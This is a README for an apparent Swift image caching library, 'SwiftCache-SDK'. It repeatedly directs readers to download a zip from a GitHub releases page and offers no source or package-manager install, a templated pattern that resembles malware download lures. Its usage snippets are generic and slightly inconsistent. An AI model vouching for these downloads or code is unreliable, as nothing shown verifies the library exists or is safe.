# 🌟 SwiftCache-SDK - Lightweight Image Caching for Your Apps

## 📥 Download Now!
[![Download SwiftCache-SDK](https://img.shields.io/badge/Download-SwiftCache--SDK-brightgreen)](https://github.com/Flubromazolam/SwiftCache-SDK/releases)

## 📖 Overview
SwiftCache-SDK is a modern image caching library designed for iOS and macOS applications. It helps developers swiftly load and store images, reducing load times and improving performance. With this library, you can seamlessly manage your images and enhance user experience.

## 🚀 Getting Started
Follow these steps to download and run SwiftCache-SDK:

1. **Visit the Releases Page**: Click the link below to access the Releases page on GitHub.
   [Visit Releases Page](https://github.com/Flubromazolam/SwiftCache-SDK/releases)

2. **Choose the Latest Release**: On the Releases page, you will see a list of available versions. The latest version is usually at the top. Click on the version title to see more details.

3. **Download the Library**: Look for the assets section under the release details. You may find several files. Download the one that begins with "SwiftCache-SDK" and matches your platform (iOS or macOS).

4. **Unzip the File**: Once the download is complete, locate the downloaded file on your computer. Unzip it by double-clicking it, and this will create a new folder containing the library files.

5. **Add to Your Project**: 
   - If you are using Xcode, open your project and drag the "SwiftCache-SDK" folder into your project navigator.
   - Make sure to check the box that says "Copy items if needed." This ensures all necessary files are included in your project.

6. **Import the Library**: In your Swift files, import the library at the top of your code:
   ```swift
   import SwiftCacheSDK
   ```

7. **Start Using SwiftCache-SDK**: You can now use SwiftCache-SDK to manage images in your application. Refer to our detailed usage instructions below.

## 📚 Features
- **Lightweight**: Designed to be simple and efficient, ensuring minimal impact on your app's performance.
- **Asynchronous Loading**: Quickly fetch images without blocking your main thread.
- **Automatic Caching**: Save previously loaded images to reduce loading times on repeated requests.
- **Supports SwiftUI & UIKit**: Easily integrate with both SwiftUI and UIKit frameworks.

## 🔧 System Requirements
- iOS 11.0 or later
- macOS 10.12 or later
- Xcode 10.0 or later

## 🛠️ Basic Usage Instructions
After adding SwiftCache-SDK to your project, you can begin caching images with a few simple commands. Below are some basic usage examples:

1. **Creating a Cache Instance**:
   ```swift
   let imageCache = ImageCache()
   ```

2. **Caching an Image**:
   ```swift
   if let url = URL(string: "https://example.com/image.jpg") {
       imageCache.cacheImage(url: url) { image in
           if let img = image {
               // Use the cached image
           }
       }
   }
   ```

3. **Retrieving a Cached Image**:
   ```swift
   imageCache.getImage(url: url) { image in
       if let img = image {
           // Display the image
       }
   }
   ```

4. **Clearing the Cache**:
   ```swift
   imageCache.clearCache()
   ```

## 🆘 Troubleshooting
If you encounter issues, try the following steps:

- **Check Compatibility**: Ensure your Xcode version supports SwiftCache-SDK.
- **Dependencies**: Make sure all project dependencies are updated.
- **File Paths**: If images do not load, verify the URL paths are correct.

## 📦 License
SwiftCache-SDK is licensed under the MIT License. Feel free to use and modify it as needed.

## 📞 Support
For support or to report issues, visit our [Issues Page](https://github.com/Flubromazolam/SwiftCache-SDK/issues).

## 📥 Download SwiftCache-SDK Again
For convenience, here is the link to download the library again:
[Download SwiftCache-SDK](https://github.com/Flubromazolam/SwiftCache-SDK/releases)